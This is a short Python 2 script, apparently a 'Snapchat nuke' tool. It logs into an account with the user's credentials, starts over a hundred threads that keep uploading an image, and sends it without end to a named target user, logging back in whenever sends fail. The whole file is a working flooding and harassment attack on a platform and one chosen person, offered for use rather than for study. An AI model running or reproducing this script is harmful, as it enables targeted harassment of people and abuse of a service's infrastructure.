from Snapchat.snapchat import Snapchat
import thread

class SnapchatNuke:
    
    def __init__(self):
        self.snapper = Snapchat()
        self.target = raw_input('Target: ')
        self.username = raw_input('Username: ')
        self.password = raw_input('Password: ')
        self.snapper.login(self.username, self.password)
        self.index = 0
        self.failures = 0
        self.images = []
        for i in range(0, 100):
            thread.start_new_thread(self.storeImages, () )
        for i in range(0, 15):
            thread.start_new_thread(self.sendSnapchat, () )
        self.sendSnapchat()
        
    def sendSnapchat(self):
        while True:
            if self.images:
                if self.snapper.send(self.images[0], self.target):
                    self.images.remove(self.images[0])
                    self.index += 1 
                    print 'image number %s' % self.index
                else:
                    self.failures += 1
                    print 'Failed attempt #%s' % self.failures
                    if self.failures >= 25: #We can assume this is a problem
                        try:
                            self.failures = 0
                            self.snapper.login(self.username, self.password)
                        except TypeError:
                            #This problem solves itself, just handling it because fuck you python.
                            pass
            
    def storeImages(self):
        while True:
            media2send = self.snapper.upload(Snapchat.MEDIA_IMAGE, 'Examples/simpsons.jpg')
            self.images.append(media2send)
            
SnapchatNuke = SnapchatNuke()
